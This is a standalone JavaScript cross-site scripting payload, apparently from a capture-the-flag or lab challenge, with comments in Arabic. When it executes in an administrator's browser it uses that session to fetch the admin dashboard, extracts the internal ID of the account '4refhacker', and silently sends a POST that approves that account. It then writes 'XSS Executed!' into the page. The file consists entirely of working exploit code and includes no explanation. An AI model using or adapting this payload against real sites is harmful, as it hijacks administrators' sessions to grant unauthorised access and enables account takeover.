(function() {
         fetch('/admin/dashboard', {
             method: 'GET',
             credentials: 'include'
         })
         .then(response => response.text())
         .then(data => {
             var parser = new DOMParser();
             var doc = parser.parseFromString(data, 'text/html');
             var userId = null;

             // ابحث عن li تحتوي على 4refhacker
             var listItems = doc.querySelectorAll('li');
             listItems.forEach(item => {
                 if (item.textContent.includes('4refhacker')) {
                     var form = item.querySelector('form[action^="/admin/approve/"]');
                     if (form) {
                         var action = form.getAttribute('action');
                         userId = action.split('/admin/approve/')[1];
                     }
                 }
             });

             if (userId) {
                 // ابعت POST request للـ approve
                 fetch('/admin/approve/' + userId, {
                     method: 'POST',
                     credentials: 'include'
                 })
                 .then(() => {
                     console.log('Approved user: 4refhacker with userId: ' + userId);
                     document.body.innerHTML += '<h1>XSS Executed! Approved 4refhacker</h1>';
                 })
                 .catch(error => console.error('Error:', error));
             } else {
                 console.error('User 4refhacker not found');
             }
         })
         .catch(error => console.error('Error:', error));
     })();
